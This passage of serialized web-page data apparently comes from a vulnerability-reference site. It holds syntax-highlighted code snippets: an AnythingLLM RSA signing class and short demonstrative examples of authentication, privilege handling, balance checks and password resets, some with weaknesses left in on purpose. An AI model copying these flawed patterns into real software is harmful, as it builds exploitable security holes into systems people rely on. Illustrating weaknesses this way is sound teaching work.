\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003elog\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"token string\"\u003e\"RSA key pair generated for signed payloads within AnythingLLM services.\"\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"token comment\"\u003e// This instance of ComKey on server is intended for generation of Priv/Pub key for signing and decoding.\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// this resource is shared with /collector/ via a class of the same name in /utils which does decoding/verification only\u003c/span\u003e\n  \u003cspan class=\"token comment\"\u003e// while this server class only does signing with the private key.\u003c/span\u003e\n  \u003cspan class=\"token function\"\u003esign\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etextData \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e crypto\n      \u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esign\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"RSA-SHA256\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e Buffer\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003efrom\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etextData\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ethis\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003e#readPrivateKey\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003etoString\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"hex\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\nmodule\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eexports \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e CommunicationKey \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"40:Te8f,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eprivate\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eboolean\u003c/span\u003e isUserAuthentic \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token boolean\"\u003efalse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003epublic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eboolean\u003c/span\u003e \u003cspan class=\"token function\"\u003eauthenticateUser\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e username\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e password\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// authenticate user,\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// if user is authenticated then set variable to true\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// otherwise set variable to false\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003epublic\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eBankAccount\u003c/span\u003e \u003cspan class=\"token function\"\u003ecreateNewBankAccount\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e accountNumber\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e accountType\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e accountName\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e accountSSN\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003edouble\u003c/span\u003e balance\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token class-name\"\u003eBankAccount\u003c/span\u003e account \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enull\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eisUserAuthentic\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        account \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eBankAccount\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        account\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esetAccountNumber\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaccountNumber\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        account\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esetAccountType\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaccountType\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        account\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esetAccountOwnerName\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaccountName\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        account\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esetAccountOwnerSSN\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaccountSSN\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        account\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esetBalance\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebalance\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e account\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"41:T9cd,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token variable\"\u003e$transfer_amount\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e GetTransferAmount\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$balance\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e GetBalanceFromDatabase\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$transfer_amount\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    FatalError\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Bad Transfer Amount\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$newbalance\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$balance\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$transfer_amount\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$balance\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$transfer_amount\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    FatalError\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Insufficient Funds\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\nSendNewBalanceToDatabase\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$newbalance\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\nNotifyUser\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Transfer of $transfer_amount succeeded.\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\nNotifyUser\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"New balance: $newbalance\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"42:T4e6,\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"token function\"\u003ef\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003epthread_mutex_t\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003emutex\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e result\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    result \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epthread_mutex_lock\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003emutex\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e \u003cspan class=\"token operator\"\u003e!=\u003c/span\u003e result\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e result\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token comment\"\u003e/* access shared resource */\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token function\"\u003epthread_mutex_unlock\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003emutex\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n43:T719,\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003emakeNewUserDir\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eusername\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e invalidUsername\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eusername\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e#avoid CWE-22 and CWE-78\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'Usernames cannot contain invalid characters'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eFalse\u003c/span\u003e\n\n    \u003cs"])</script><script>self.__next_f.push([1,"pan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        raisePrivileges\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        os\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003emkdir\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'/home/'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e username\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        lowerPrivileges\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e OSError\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'Unable to create new user directory for user:'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e username\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eFalse\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eTrue\u003c/span\u003e\n44:Tee9,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003epublic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eenum\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eRoles\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token constant\"\u003eADMIN\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token constant\"\u003eOPERATOR\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token constant\"\u003eUSER\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token constant\"\u003eGUEST\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003epublic\u003c/span\u003e \u003cspan class=\"token keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"token function\"\u003eresetPassword\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eUser\u003c/span\u003e requestingUser\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eUser\u003c/span\u003e user\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eString\u003c/span\u003e password\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003eisAuthenticated\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003erequestingUser\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eswitch\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003erequestingUser\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erole\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"token constant\"\u003eGUEST\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token class-name\"\u003eSystem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eout\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eprintln\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"You are not authorized to perform this command\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"token keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"token constant\"\u003eUSER\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token class-name\"\u003eSystem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eout\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eprintln\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"You are not authorized to perform this command\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"token keyword\"\u003edefault\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token function\"\u003esetPassword\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003euser\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e password\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token class-name\"\u003eSystem\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eout\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eprintln\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"You must be logged in to perform this command\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"45:T1266,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token comment\"\u003e/* Create pid file before we drop privileges */\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003econfig\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epidpath\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003epidfile_create\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003econfig\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epidpath\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"token function\"\u003efprintf\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token constant\"\u003estderr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"%s: Could not create PID file.\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n                         argv\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"token function\"\u003eexit\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eEX_OSERR\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* Switch to a different user if we're running as root */\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003egeteuid\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003echange_user\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eargv\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003elog_message\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eLOG_WARNING\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n                     \u003cspan class=\"token string\"\u003e\"Not running as root, so not changing UID/GID.\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e/* Create log file after we drop privileges */\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003esetup_logging\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eexit\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eEX_SOFTWARE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* Create pid file after we drop privileges */\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003econfig\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epidpath\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003epidfile_create\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003econfig\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epidpath\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"token function\"\u003efprintf\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token constant\"\u003estderr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"%s: Could not create PID file.\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n                         argv\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"token function\"\u003eexit\u003c/span\u003e \u003cspan class=\"token 